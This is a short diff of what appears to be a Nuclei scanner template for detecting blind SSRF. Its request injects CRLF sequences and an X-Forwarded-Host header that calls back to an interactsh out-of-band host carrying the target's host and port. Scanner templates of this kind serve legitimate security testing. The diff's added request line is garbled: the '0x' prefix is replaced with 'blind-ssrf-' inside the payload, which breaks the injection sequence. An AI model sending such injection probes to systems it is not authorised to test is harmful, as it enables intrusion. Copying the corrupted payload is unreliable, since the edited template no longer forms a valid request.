@@ -1,4 +1,4 @@
-id: 0x105
+id: blind-ssrf-105
 
 info:
   name: Blind SSRF
@@ -9,7 +9,7 @@ info:
 http:
   - raw:
       - |
-        GET /%20HTTP/1.10x0D0x0ADX-Forwarded-Host:%20{{Host}}.{{Port}}.BSSRF-105.{{interactsh-url}}0x0D0x0A0x0D0x0A HTTP/1.1
+        GET /%20HTTP/1.1blind-ssrf-0Dblind-ssrf-0ADX-Forwarded-Host:%20{{Host}}.{{Port}}.BSSRF-105.{{interactsh-url}}blind-ssrf-0Dblind-ssrf-0Ablind-ssrf-0Dblind-ssrf-0A HTTP/1.1
         Host: {{Hostname}}
         User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
         Cache-Control: no-transform
